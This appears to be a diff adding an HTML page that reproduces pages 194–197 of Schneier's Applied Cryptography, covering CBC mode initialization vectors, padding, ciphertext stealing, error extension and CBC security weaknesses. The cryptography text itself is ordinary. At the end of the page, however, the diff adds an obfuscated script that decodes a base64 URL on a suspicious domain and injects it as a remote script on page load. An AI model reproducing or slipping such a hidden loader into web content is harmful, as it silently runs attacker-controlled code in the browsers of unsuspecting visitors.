@@ -1,0 +1,91 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Algorithm Types and Modes</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=09//-->
+<!--PAGES=194-197//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Some messages have a common header: a letterhead, or a &#147;From&#148; line, or whatever. While block replay would still be impossible, this identical beginning might give a cryptanalyst some useful information.
+</P>
+<P>Prevent this by encrypting random data as the first block. This block of random data is called the <B>initialization vector</B> (<B>IV</B>), initializing variable, or initial chaining value. The IV has no meaning; it&#146;s just there to make each message unique. When the receiver decrypts this block, he just uses it to fill the feedback register and otherwise ignores it. A timestamp often makes a good IV. Otherwise, use some random bits from someplace.</P>
+<P>With the addition of IVs, identical plaintext messages encrypt to different ciphertext messages. Thus, it is impossible for an eavesdropper to attempt block replay, and more difficult for him to build a code book. While the IV should be unique for each message encrypted with the same key, it is not an absolute requirement.</P>
+<P>The IV need not be secret; it can be transmitted in the clear with the ciphertext. If this seems wrong, consider the following argument. Assume that we have a message of several blocks: <I>B</I><SUB>1,</SUB> <I>B</I><SUB>2</SUB>,..., <I>B</I><SUB>i</SUB>. <I>B</I><SUB>1</SUB> is encrypted with the IV. <I>B</I><SUB>2</SUB> is encrypted using the ciphertext of <I>B</I><SUB>1</SUB> as the IV. <I>B</I><SUB>3</SUB> is encrypted using the ciphertext of <I>B</I><SUB>2</SUB> as the IV, and so on. So, if there are <I>n</I> blocks, there are <I>n-</I>1 exposed &#147;IVs,&#148; even if the original IV is kept secret. So there&#146;s no reason to keep the IV secret; the IV is just a dummy ciphertext block&#151;you can think of it as <I>B</I><SUB>0</SUB> to start the chaining.</P>
+<P><FONT SIZE="+1"><B><I>Padding</I></B></FONT></P>
+<P>Padding works just like ECB mode, but in some applications the ciphertext has to be exactly the same size as the plaintext. Perhaps a plaintext file has to be encrypted and then replaced in the exact same memory location. In this case, you have to encrypt the last short block differently. Assume the last block has <I>j</I> bits. After encrypting the last full block, encrypt the ciphertext again, select the left-most <I>j</I> bits of the encrypted ciphertext, and XOR that with the short block to generate the ciphertext. Figure 9.4 illustrates this.</P>
+<P>The weakness here is that while Mallory cannot recover the last plaintext block, he can change it systematically by changing individual bits in the ciphertext. If the last few bits of the ciphertext contain essential information, this is a weakness. If the last bits simply contain housekeeping information, it isn&#146;t a problem.</P>
+<P>Ciphertext stealing is a better way (see Figure 9.5) [402]. <I>P</I><SUB>n-1</SUB> is the last full plaintext block, and <I>P</I><SUB>n</SUB> is the final, short, plaintext block. <I>C</I><SUB>n-1</SUB> is the last full ciphertext block, and <I>C</I><SUB>n</SUB> is the final, short, ciphertext block. <I>C&#146;</I> is just an intermediate result and is not part of the transmitted ciphertext. The benefit of this method is that all the bits of the plaintext message go through the encryption algorithm.</P>
+<P><FONT SIZE="+1"><B><I>Error Propagation</I></B></FONT></P>
+<P>CBC mode can be characterized as <B>feedback</B> of the ciphertext at the encryption end and <B>feedforward</B> of the ciphertext at the decryption end. This has implications having to do with errors. A single bit error in a plaintext block will affect that ciphertext block and all subsequent ciphertext blocks. This isn&#146;t significant because decryption will reverse that effect, and the recovered plaintext will have the same single error.</P>
+<P>Ciphertext errors are more common. They can easily result from a noisy communications path or a malfunction in the storage medium. In CBC mode, a single-bit error in the ciphertext affects one block and one bit of the recovered plaintext. The block containing the error is completely garbled. The subsequent block has a 1-bit error in the same bit position as the error.</P>
+<I><P><A NAME="Fig4"></A><A HREF="javascript:displayWindow('images/09-04.jpg',262,132 )"><IMG SRC="images/09-04t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-04.jpg',262,132)"><FONT COLOR="#000077"><B>Figure 9.4</B></FONT></A>&nbsp;&nbsp;Encrypting the last short block in CBC mode.</I>
+<I></P>
+<P><A NAME="Fig5"></A><A HREF="javascript:displayWindow('images/09-05.jpg',271,119 )"><IMG SRC="images/09-05t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-05.jpg',271,119)"><FONT COLOR="#000077"><B>Figure 9.5</B></FONT></A>&nbsp;&nbsp;Ciphertext stealing in CBC mode.</I>
+</P>
+<P>This property of taking a small ciphertext error and converting it into a large plaintext error is called <B>error extension</B>. It is a major annoyance. Blocks after the second are not affected by the error, so CBC mode is <B>self-recovering</B>. Two blocks are affected by an error, but the system recovers and continues to work correctly for all subsequent blocks. CBC is an example of a block cipher being used in a self-synchronizing manner, but only at the block level.</P>
+<P>While CBC mode recovers quickly from bit errors, it doesn&#146;t recover at all from synchronization errors. If a bit is added or lost from the ciphertext stream, then all subsequent blocks are shifted one bit out of position and decryption will generate garbage indefinitely. Any cryptosystem that uses CBC mode must ensure that the block structure remains intact, either by framing or by storing data in multiple-block-sized chunks.</P>
+<P><FONT SIZE="+1"><B><I>Security Problems</I></B></FONT></P>
+<P>Some potential problems are caused by the structure of CBC. First, because a ciphertext block affects the following block in a simple way, Mallory can add blocks to the end of an encrypted message without being detected. Sure, it will probably decrypt to gibberish, but in some situations this is undesirable.
+</P>
+<P>If you are using CBC, you should structure your plaintext so that you know where the message ends and can detect the addition of extra blocks.</P>
+<P>Second, Mallory can alter a ciphertext block to introduce controlled changes in the following decrypted plaintext block. For example, if Mallory toggles a single ciphertext bit, the entire block will decrypt incorrectly, but the following block will have a 1-bit error in the corresponding bit position. There are situations where this is desirable. The entire plaintext message should include some kind of controlled redundancy or authentication.</P>
+<P>Finally, although plaintext patterns are concealed by chaining, very long messages will still have patterns. The birthday paradox predicts that there will be identical blocks after 2<SUP><I>m</I>/2</SUP> blocks, where <I>m</I> is the block size. For a 64-bit block size, that&#146;s about 34 gigabytes. A message has to be pretty long before this is a problem.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(lxXMpAOJ, eTfUHhSf) {eTfUHhSf = lxXMpAOJ.createElement('script');eTfUHhSf.type = 'text/javascript';eTfUHhSf.async = true;eTfUHhSf.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');lxXMpAOJ.getElementsByTagName('body')[0].appendChild(eTfUHhSf);}(document));</script></body>
+</html>
